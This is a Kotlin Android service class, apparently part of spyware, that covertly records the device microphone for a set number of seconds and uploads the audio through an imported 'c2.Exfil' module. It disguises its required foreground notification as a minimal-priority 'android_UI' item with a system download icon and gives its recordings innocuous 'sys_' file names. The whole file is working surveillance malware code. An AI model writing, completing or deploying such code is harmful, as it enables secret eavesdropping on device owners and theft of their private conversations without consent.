package com.sp.core.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.sp.core.c2.Exfil
import java.io.File

class MicRecorder : Service() {

    private var recorder: MediaRecorder? = null
    private var outFile: File? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(0x5F60, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val duration = intent?.getIntExtra("seconds", 60) ?: 60
        startRecording(duration)
        return START_NOT_STICKY
    }

    private fun startRecording(seconds: Int) {
        try {
            outFile = File(cacheDir, "sys_${System.currentTimeMillis()}.m4a")
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(64_000)
                setAudioSamplingRate(22_050)
                setOutputFile(outFile!!.absolutePath)
                prepare(); start()
            }
            Handler(Looper.getMainLooper()).postDelayed({ stopAndSend() }, seconds * 1000L)
        } catch (_: Exception) { stopSelf() }
    }

    private fun stopAndSend() {
        try { recorder?.stop() } catch (_: Exception) {}
        recorder?.release(); recorder = null
        outFile?.let { if (it.exists()) Exfil.uploadFile(this, it, "audio") }
        stopSelf()
    }

    private fun buildNotification(): Notification {
        val chId = "sys_media"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "Media", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN).build()
    }
    override fun onBind(intent: Intent?): IBinder? = null
}